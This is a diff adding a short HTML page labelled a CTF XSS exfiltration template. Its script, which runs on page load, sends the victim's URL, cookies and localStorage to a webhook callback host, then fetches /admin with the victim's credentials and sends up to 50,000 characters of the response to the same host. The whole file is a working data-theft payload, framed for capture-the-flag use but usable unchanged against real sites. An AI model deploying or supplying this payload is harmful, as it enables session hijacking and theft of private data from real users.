@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CTF XSS Exfil Template</title>
+<script>
+// Replace CALLBACK before hosting/submitting.
+const CALLBACK = "https://webhook.site/ID";
+
+function send(label, value) {
+  try {
+    navigator.sendBeacon(CALLBACK + "?label=" + encodeURIComponent(label), value);
+  } catch (e) {
+    fetch(CALLBACK + "?label=" + encodeURIComponent(label), {
+      method: "POST",
+      mode: "no-cors",
+      body: value
+    });
+  }
+}
+
+send("location", location.href);
+send("cookie", document.cookie || "no-cookie");
+send("localStorage", JSON.stringify(localStorage));
+
+fetch("/admin", {credentials: "include"})
+  .then(r => r.text())
+  .then(t => send("admin", t.slice(0, 50000)))
+  .catch(e => send("admin-error", String(e)));
+</script>
+
